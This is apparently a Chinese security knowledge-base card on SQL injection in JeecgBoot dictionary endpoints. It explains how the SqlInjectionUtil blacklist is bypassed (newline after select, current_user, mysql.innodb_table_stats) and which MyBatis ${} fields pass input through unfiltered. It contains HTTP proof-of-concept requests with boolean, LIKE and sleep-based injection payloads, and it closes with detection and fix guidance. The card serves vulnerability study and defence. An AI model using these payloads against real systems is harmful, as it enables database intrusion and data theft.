---
id: web-java-framework-jeecgboot-dict-blacklist-bypass-sqli
title: JeecgBoot 字典接口 SQL 注入：黑名单 select%0a/current_user/innodb_table_stats 绕过与未过滤透传
type: scenario
domain: web
path: web/java/framework
technique: jeecg-dict-blacklist-bypass-sqli
tags:
- sqli
- java
- mybatis
- jeecg
- blacklist-bypass
- blind
- time-blind
- like-injection
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:26:54+08:00'
  notes: 已对照原文与图04/05核对：specialDictSqlXssStr 含 'select '（尾随空格）与 information_schema，XSS_REGULAR_STR_ARRAY 含 user\s*\(、sleep 等，无 exists/and/or；SysDictMapper.xml queryTableDictWithFilterSqlFragment 使用 ///where ，树查询 _tableFilterSql 走 。三处绕过（select%0a、current_user、mysql.innodb_table_stats）、loadDict keyword 直拼 LIKE、loadTreeData condition JSON 透传、7 接口清单均与原文一致；原文无原始响应但给出 1=1/1=2 与 0.016s→15s 时延证据，置信 high 保留。未设置 affected_versions：3.9.1 为审计/目标版本，v3.4.x 仅说明黑名单引入时间，原文未给完整影响区间。PoC 未在本机执行。frontmatter 无 sources/source_url。
url: /docs/web/java/framework/web-java-framework-jeecgboot-dict-blacklist-bypass-sqli/
draft: false
kb_aliases:
- JeecgBoot 字典 SQL 注入
- specialFilterContentForDictSql 绕过
- select 换行绕过黑名单
- current_user 绕过 user()
- innodb_table_stats 替代 information_schema
- _tableFilterSql 注入
---

## 一句话结论

JeecgBoot 字典类接口把用户可控值拼进 MyBatis 的 `${}`，官方在 v3.4.x 用 `SqlInjectionUtil.specialFilterContentForDictSql()` 黑名单“修复”，但该黑名单存在三处结构性缺口：`select` 关键字带尾随空格、`information_schema` 完整匹配、只拦 `user()` 带括号形式；因此可用 `select%0a`（换行代替空格）、`current_user`（无需括号）、`mysql.innodb_table_stats`（替代 information_schema）绕过。另有 `loadDict` 的 `keyword` 直接拼 LIKE、`loadTreeData` 的 `condition._tableFilterSql` 整体透传，连黑名单都不经过，形成布尔、LIKE 与时间盲注。

## 原理

- 历史修复方式：`SqlInjectionUtil` 维护关键词串 `specialDictSqlXssStr`（含 `exec`、`information_schema`、`extractvalue`、`updatexml`、`insert`、`select ` 等）与正则数组 `XSS_REGULAR_STR_ARRAY`（`chr\s*\(`、`mid\s*\(`、` char\s*\(`、`sleep\s*\(`、`user\s*\(`、`show\s+tables`、`user[\s]*\([\s]*\)`、`show\s+databases`、`sleep\(\d*\)`、`sleep\(.*\)`）。
- 缺口一：关键词 `select ` 带一个尾随空格，只匹配“select + 空格”的字面；MySQL 把换行视为空白，`select%0a1` 不包含“select 空格”，可正常执行。
- 缺口二：`user\s*\(` / `user[\s]*\([\s]*\)` 只拦 `user()` 这种带括号调用；MySQL 的 `current_user` 是不带括号的内置变量，可直接读取当前用户。
- 缺口三：`information_schema` 被完整匹配，但 `mysql.innodb_table_stats`、`mysql.innodb_index_stats` 同样能枚举库表名，不含被拦字符串。
- 缺口四：黑名单只覆盖部分危险词，没有 `exists`、`and`、`or`；布尔条件与 `exists` 子查询可直接使用。
- 透传点：`SysDictMapper.xml` 中 `queryTableDictWithFilterSqlFragment` 使用 `where ${filterSql}`、树查询使用 `<if test="key == '_tableFilterSql'">and ${value}</if>`，都是文本替换而非 `#{}` 预编译；黑名单只是应用层字符串过滤，不改变 `${}` 的注入本质。
- 入口分三类：过黑名单但可绕（`getDictItems`、`queryFilterTableDictInfo`、`queryTableDictItemsByCode`、`loadDictItem`）；完全不过黑名单的字符串拼接（`loadDict`、`loadDictItemByKeyword` 的 keyword 直接进 LIKE）；JSON 透传（`loadTreeData` 的 `condition._tableFilterSql` 直接进 Mapper）。
- 根因：用黑名单/正则修补 `${}` 拼接，属于“枚举坏字符”的负向防御；只要存在等价语法（换行、无括号函数、替代系统表）就会失效，正确做法是 `#{}` 参数化或标识符白名单。

## 触发条件

- 目标为使用该字典接口实现的 JeecgBoot（文章审计 3.9.1；v3.4.x 起使用该黑名单）。
- 攻击者可访问 `/sys/dict/*`、`/sys/api/*` 字典接口（是否需要登录取决于部署与网关策略；文章未把认证列为前提）。
- 数据库为 MySQL/MariaDB（`mysql.innodb_table_stats`、`current_user`、`%0a` 语义依赖 MySQL）。
- 注入参数能到达上述 `${}` 拼接点，且应用未额外做参数化改造或 RASP 拦截。

## 利用步骤

1. 探测：请求 `/sys/dict/loadTreeData` 或 `/sys/dict/getDictItems/...`，确认字典数据回显与基线耗时。
2. 布尔盲注（过黑名单可绕）：`/sys/dict/getDictItems/<table>,<text>,<code>,1=1` 返回数据，替换为 `1=2` 返回空；进一步用 `select%0a...` 构造子查询。
3. LIKE 注入（未过黑名单）：`/sys/dict/loadDict/<dictCode>?keyword=%' OR 1=1 OR '%'='`，拼出 `like '%%' OR 1=1 OR '%'='%'`，返回全部字典项。
4. 时间盲注（JSON 透传）：POST `/sys/dict/loadTreeData`，请求体 `condition={"_tableFilterSql":"1=1 and sleep(5)"}`，基线约 0.016s，注入后约 15s，确认可执行。
5. 枚举：`current_user` 取当前库用户；用 `mysql.innodb_table_stats` 查表名，绕过 `information_schema`；再按需用布尔/时间盲注逐字符取数据。
6. 同类接口批量测试：`/sys/api/queryFilterTableDictInfo`（filterSql）、`/sys/api/queryTableDictItemsByCode`（tableFilterSql）、`/sys/api/loadDictItemByKeyword`（keyword）、`/sys/dict/loadDictItem/{dictCode}`（dictCode 表名）。

## PoC

```http
### 1) 布尔盲注（filterSql 过黑名单后进 ${filterSql}）
GET /sys/dict/getDictItems/sys_user,realname,username,1=1 HTTP/1.1
Host: target
# 返回字典项；改成 1=2 返回空

### 2) LIKE 注入（keyword 不过黑名单，直接拼 LIKE）
GET /sys/dict/loadDict/sys_user,realname,username?keyword=%25%27%20OR%201=1%20OR%20%27%25%27=%27 HTTP/1.1
Host: target
# 解码：keyword=%' OR 1=1 OR '%'='
# 拼出：realname like '%%' OR 1=1 OR '%'='%'

### 3) 时间盲注（condition JSON 的 _tableFilterSql 透传到 ${value}）
POST /sys/dict/loadTreeData HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

condition={"_tableFilterSql":"1=1 and sleep(5)"}
```

```text
文章实验数据：
- 基线请求约 0.016s；注入 sleep 后约 15s，确认时间盲注可执行。
- getDictItems 的 1=1 返回数据、1=2 返回空，确认布尔盲注。
- 黑名单绕过点：select 后跟 %0a 换行；current_user 不带括号；mysql.innodb_table_stats 替代 information_schema。
PoC 未在本机执行，数据来自文章描述。
```

## 变体与关联

- 变体（过黑名单的接口）：`/sys/dict/getDictItems/{dictCode}`、`/sys/api/queryFilterTableDictInfo`、`/sys/api/queryTableDictItemsByCode`、`/sys/dict/loadDictItem/{dictCode}`；参数名分别为 filterSql、tableFilterSql、dictCode（表名），均可能拼接进 `${}`。
- 变体（未过黑名单）：`/sys/dict/loadDict/{dictCode}` 与 `/sys/api/loadDictItemByKeyword` 的 keyword 直接拼 LIKE；`/sys/dict/loadTreeData` 的 condition JSON 整体透传。
- 变体（黑名单继续演进）：`select%09`/`select%0b`/`select/**/` 等空白与注释替代；`current_user()`（带括号）会被拦，但 `current_user` 不带括号可绕；系统表还可用 `performance_schema`（注意被关键词拦截）之外的 `mysql.*` 统计表。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]] 是 `${}` 注入的通用原理；本卡是其上的“应用层黑名单绕过 + 多接口透传”具体案例。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]] 提供 `sleep`/`if` 被过滤后的替代原语；本卡的时间盲注接口本身不过黑名单，可直接 `sleep`。
- 边界：黑名单只作用于部分入口，不是统一 WAF；`loadTreeData` 的 `condition` 必须是合法 JSON 且键名匹配 `_tableFilterSql`；目标数据库非 MySQL 时 `innodb_table_stats`、`%0a` 等技巧需替换。

## 检测与防御

- 请求检测：字典接口参数中出现 `select%0a`/`select%0d`/`select/**/`、`current_user`、`mysql.innodb_table_stats`、`exists`、`and`、`or`、`sleep`、`_tableFilterSql`、`filterSql`、`tableFilterSql`、LIKE 通配符 `%'`；同一参数高频布尔/时间探测。
- 主机检测：MyBatis SQL 日志中出现字典表查询被拼接进子查询/函数；慢查询日志出现 `sleep`、`benchmark`、`information_schema`/`mysql.innodb_table_stats`；数据库连接账户权限过高。
- 修复：把 `${filterSql}`/`${value}` 改为参数化或白名单；字典过滤 SQL 不应由外部传入完整表达式，改为固定条件字段 + 操作符白名单 + `#{}` 值。
- 修复：`loadDict` 的 keyword 用 `#{}` 与 `concat('%', #{keyword}, '%')`；`loadTreeData` 禁止 `_tableFilterSql` 透传，改为服务端可枚举的排序/过滤键。
- 加固：数据库账号最小权限，禁止 `mysql.*` 统计表读取；部署 RASP/MyBatis 拦截器检测 `${}` 动态值；将黑名单升级为正则白名单或 AST 校验，但根本仍是消除 `${}` 拼接。
- 审计：全局搜索 Mapper XML 的 `${`，逐一回溯参数到 Controller；重点检查“已有 SqlInjectionUtil 调用”的伪修复点，确认过滤方法是否覆盖所有入口与所有等价语法。
